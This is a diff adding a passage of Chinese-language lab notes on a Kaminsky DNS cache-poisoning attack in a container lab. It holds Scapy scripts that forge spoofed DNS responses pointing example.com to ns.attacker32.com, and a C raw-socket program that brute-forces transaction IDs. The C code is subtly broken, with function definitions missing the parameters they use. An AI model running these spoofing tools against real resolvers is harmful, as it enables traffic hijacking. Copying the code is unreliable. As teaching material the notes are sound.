@@ -67,9 +67,249 @@ comments: true
 	
 	![](../../../../../assets/Pasted%20image%2020250404205149.png)
 	
+***
+## 构造 DNS 请求
+
+在攻击者容器中编写发送 DNS 请求的代码 `DNS_Request.py`：
+
+```python title="DNS_Request.py"
+from scapy.all import *
+
+Qdsec = DNSQR(qname = 'twysw.example.com')
+dns = DNS(id = 0xAAAA, qr = 0, qdcount = 1, ancount = 0, nscount = 0, arcount = 0, qd = Qdsec)
+
+ip = IP(dst = '10.9.0.53', src = '10.9.0.153')
+udp = UDP(dport = 53, sport = 33333, chksum = 0)
+request = ip/udp/dns
+
+send(request, verbose = 0)
+```
+
+在攻击者容器中运行 `tshark -i eth0 -f "udp port 53 and host 10.9.0.53" -Y "dns"` 开启监听：（这里容器没有 tshark，以及 pip？）
+
+![](../../../../../assets/Pasted%20image%2020250404220411.png)
+
+运行 `python3 DNS_Request.py` 发送 DNS 请求，再次观察 tshark 的输出：
+
+![](../../../../../assets/Pasted%20image%2020250405140403.png)
+
+可以看到 DNS 请求已经发送成功，查询并无 twysw.example.com 这个域名
+
+有趣的是，有的时候发送 DNS 请求会出现 DNS 77 Standard query response 0xaaaa Server failure A twysw.example.com，猜测是有概率得到 response？
+***
+## 伪造 DNS 响应
+
+同样，在攻击者容器中编写伪造 DNS 响应的代码 `DNS_Response.py`：
+
+```python title="DNS_Response.py"
+from scapy.all import *
+
+name = 'twysw.example.com'
+domain = 'example.com'
+ns = 'ns.attacker32.com'
+
+Qdsec = DNSQR(qname = name)
+Anssec = DNSRR(rrname = name, type = 'A', rdata = '1.2.3.4', ttl = 259200)
+NSsec = DNSRR(rrname = domain, type = 'NS', rdata = ns, ttl = 259200)
+dns = DNS(id = 0xAAAA, aa = 1, rd = 1, qr = 1, qdcount = 1, ancount = 1, nscount = 1, arcount = 0, qd = Qdsec, an = Anssec, ns = NSsec)
+
+ip = IP(dst = '10.9.0.53', src = '23.210.7.166')
+udp = UDP(dport = 33333, sport = 53, chksum = 0)
+reply = ip/udp/dns
+send(reply) 
+```
+
+几个参数选择解释如下：
+
+- name：要查询的域名
+- domain：对应的上级域名
+- ns：攻击者的 DNS 服务器
+- dst：本地 DNS 服务器的 IP 地址
+- src：真实权威 DNS 服务器的 IP 地址（伪装为真实的 DNS 响应）
+- dport：本地 DNS 服务器的端口号
+- sport：源端口
+
+还是在攻击者容器中运行 `tshark -i eth0 -f "udp port 53 and host 10.9.0.53" -Y "dns"` 开启监听，再运行 `python3 DNS_Response.py` 发送伪造的 DNS 响应，观察 tshark 的输出：
+
+![](../../../../../assets/Pasted%20image%2020250405142234.png)
+
+可以看到伪造的 DNS 响应已经发送成功
+***
+## 进行 Kaminsky 攻击
+
+首先我们用 Scapy 仿照之前的代码生成 DNS 请求数据包模板并保存在文件 ip_req.bin 中：
+
+```python title="Generate_DNS_Request.py"
+from scapy.all import *
+
+Qdsec = DNSQR(qname = 'twysw.example.com')
+dns = DNS(id = 0xAAAA, qr = 0, qdcount = 1, ancount = 0, nscount = 0, arcount = 0, qd = Qdsec)
+
+ip = IP(dst = '10.9.0.53', src = '10.9.0.153')
+udp = UDP(dport = 53, sport = 33333, chksum = 0)
+request = ip/udp/dns
+
+with open("ip_req.bin", "wb") as f:
+    f.write(bytes(request))
+```
+
+再生成 DNS 响应数据包模板并保存在文件 ip_resp.bin 中：
+
+```python title="Generate_DNS_Reply.py"
+from scapy.all import *
+
+name = 'twysw.example.com'
+domain = 'example.com'
+ns = 'ns.attacker32.com'
+
+Qdsec = DNSQR(qname = name)
+Anssec = DNSRR(rrname = name, type = 'A', rdata = '1.2.3.4', ttl = 259200)
+NSsec = DNSRR(rrname = domain, type = 'NS', rdata = ns, ttl = 259200)
+dns = DNS(id = 0xAAAA, aa = 1, rd = 1, qr = 1, qdcount = 1, ancount = 1, nscount = 1, arcount = 0, qd = Qdsec, an = Anssec, ns = NSsec)
+
+ip = IP(dst = '10.9.0.53', src = '23.210.7.166')
+udp = UDP(dport = 33333, sport = 53, chksum = 0)
+pkt = ip/udp/dns
+
+with open('ip_resp.bin', 'wb') as f:
+    f.write(bytes(pkt))
+```
+
+运行 `python3 Generate_DNS_Reply.py` 生成 DNS 数据包模板 `ip.bin`，再编写 C 程序构建向 DNS 服务器发送伪造的响应数据包 `Attack.c`：
+
+```c title="Attack.c"
+#include <stdlib.h>
+#include <arpa/inet.h>
+#include <string.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <time.h>
+#include <windows.h>
+
+#define MAX_FILE_SIZE 1000000
 
 
+/* IP Header */
+struct ipheader {
+  unsigned char      iph_ihl:4, //IP header length
+                     iph_ver:4; //IP version
+  unsigned char      iph_tos; //Type of service
+  unsigned short int iph_len; //IP Packet length (data + header)
+  unsigned short int iph_ident; //Identification
+  unsigned short int iph_flag:3, //Fragmentation flags
+                     iph_offset:13; //Flags offset
+  unsigned char      iph_ttl; //Time to Live
+  unsigned char      iph_protocol; //Protocol type
+  unsigned short int iph_chksum; //IP datagram checksum
+  struct  in_addr    iph_sourceip; //Source IP address 
+  struct  in_addr    iph_destip;   //Destination IP address 
+};
+
+void send_raw_packet(char * buffer, int pkt_size);
+void send_dns_request(unsigned char *packet_template, int packet_size, char *subdomain);
+void send_dns_response(unsigned char *packet_template, int packet_size, char *subdomain, unsigned short transaction_id);
+
+int main()
+{
+  srand(time(NULL));
+
+  // Load the DNS request packet from file
+  FILE * f_req = fopen("ip_req.bin", "rb");
+  if (!f_req) {
+     perror("Can't open 'ip_req.bin'");
+     exit(1);
+  }
+  unsigned char ip_req[MAX_FILE_SIZE];
+  int n_req = fread(ip_req, 1, MAX_FILE_SIZE, f_req);
+
+  // Load the first DNS response packet from file
+  FILE * f_resp = fopen("ip_resp.bin", "rb");
+  if (!f_resp) {
+     perror("Can't open 'ip_resp.bin'");
+     exit(1);
+  }
+  unsigned char ip_resp[MAX_FILE_SIZE];
+  int n_resp = fread(ip_resp, 1, MAX_FILE_SIZE, f_resp);
+
+  char a[26]="abcdefghijklmnopqrstuvwxyz";
+  while (1) {
+    // Generate a random name with length 5
+    char name[6];
+    name[5] = '\0';
+    for (int k=0; k<5; k++)  name[k] = a[rand() % 26];
+
+    send_dns_request(ip_req, n_req, name);
+
+    for(unsigned short tid = 0; tid < 65536; tid++){
+    	printf("tid: %u\n", tid);
+        send_dns_response(ip_resp, n_resp, name, tid);
+        sleep(2);
+    }
+  }
+}
 
 
+/* Use for sending DNS request.
+ * Add arguments to the function definition if needed.
+ * */
+void send_dns_request()
+{
+	memcpy(packet_template + 41, subdomain, 5);
+
+	memcpy(packet_template + 64, subdomain, 5);
+
+	send_raw_packet(packet_template, packet_size);
+}
+
+
+/* Use for sending forged DNS response.
+ * Add arguments to the function definition if needed.
+ * */
+void send_dns_response()
+{
+	memcpy(packet_template + 41, subdomain, 5);
+
+	memcpy(packet_template + 64, subdomain, 5);
+
+	unsigned short id_net_order = htons(transaction_id);
+	memcpy(packet_template + 28, &id_net_order, 2);
+
+	send_raw_packet(packet_template, packet_size);
+}
+
+
+/* Send the raw packet out 
+ *    buffer: to contain the entire IP packet, with everything filled out.
+ *    pkt_size: the size of the buffer.
+ * */
+void send_raw_packet(char * buffer, int pkt_size)
+{
+  struct sockaddr_in dest_info;
+  int enable = 1;
+
+  // Step 1: Create a raw network socket.
+  int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+
+  // Step 2: Set socket option.
+  setsockopt(sock, IPPROTO_IP, IP_HDRINCL,
+             &enable, sizeof(enable));
+
+  // Step 3: Provide needed information about destination.
+  struct ipheader *ip = (struct ipheader *) buffer;
+  dest_info.sin_family = AF_INET;
+  dest_info.sin_addr = ip->iph_destip;
+
+  // Step 4: Send the packet out.
+  sendto(sock, buffer, pkt_size, 0,
+       (struct sockaddr *)&dest_info, sizeof(dest_info));
+  close(sock);
+}
+```
+
+编译 `gcc -o Attack Attack.c`，运行 `./Attack` 进行攻击
+***
+## 攻击结果验证
+
+运行 Attack 程序后一段时间在本地 DNS 服务器使用命令 `rndc dumpdb -cache && grep attacker /var/cache/bind/dump.db`，得到结果：
 
 
